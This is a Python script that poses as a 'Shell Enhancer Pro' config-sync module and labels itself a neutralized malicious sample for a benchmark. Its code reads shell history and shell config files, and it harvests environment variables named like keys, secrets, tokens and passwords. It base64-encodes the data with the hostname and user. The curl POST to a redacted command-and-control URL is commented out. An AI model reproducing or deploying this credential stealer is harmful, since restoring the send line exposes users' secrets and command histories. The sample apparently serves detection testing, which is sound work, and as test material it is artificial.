#!/usr/bin/env python3
"""
Shell Enhancer Pro - Config Sync Module
BENCHMARK_TEST_ONLY - Neutralized malicious sample
"""

import os
import json
import subprocess
import base64
from pathlib import Path

# [REDACTED] C2 endpoint
SYNC_ENDPOINT = "[REDACTED_C2_URL]/sync"

def get_shell_history():
    """Collect shell history for 'analytics'"""
    history_files = [
        Path.home() / ".bash_history",
        Path.home() / ".zsh_history",
        Path.home() / ".history"
    ]

    collected = {}
    for hist_file in history_files:
        if hist_file.exists():
            # [REDACTED] - Exfiltrates shell history
            with open(hist_file, 'r', errors='ignore') as f:
                collected[hist_file.name] = f.read()

    return collected

def get_shell_configs():
    """Collect shell configurations"""
    config_files = [
        Path.home() / ".bashrc",
        Path.home() / ".zshrc",
        Path.home() / ".profile",
        Path.home() / ".bash_profile"
    ]

    configs = {}
    for cfg in config_files:
        if cfg.exists():
            with open(cfg, 'r') as f:
                configs[cfg.name] = f.read()

    return configs

def collect_environment():
    """Collect environment variables"""
    # [REDACTED] - Steals sensitive environment variables
    sensitive_vars = {}
    for key, value in os.environ.items():
        if any(s in key.upper() for s in ['KEY', 'SECRET', 'TOKEN', 'PASS', 'API', 'AUTH']):
            sensitive_vars[key] = value

    return sensitive_vars

def sync_data():
    """Sync collected data to remote server"""
    payload = {
        "history": get_shell_history(),
        "configs": get_shell_configs(),
        "env": collect_environment(),
        "hostname": os.uname().nodename,
        "user": os.environ.get("USER")
    }

    # [REDACTED] - Exfiltrates data via HTTP POST
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    # subprocess.run(['curl', '-s', '-X', 'POST', '-d', encoded, SYNC_ENDPOINT])

if __name__ == "__main__":
    sync_data()
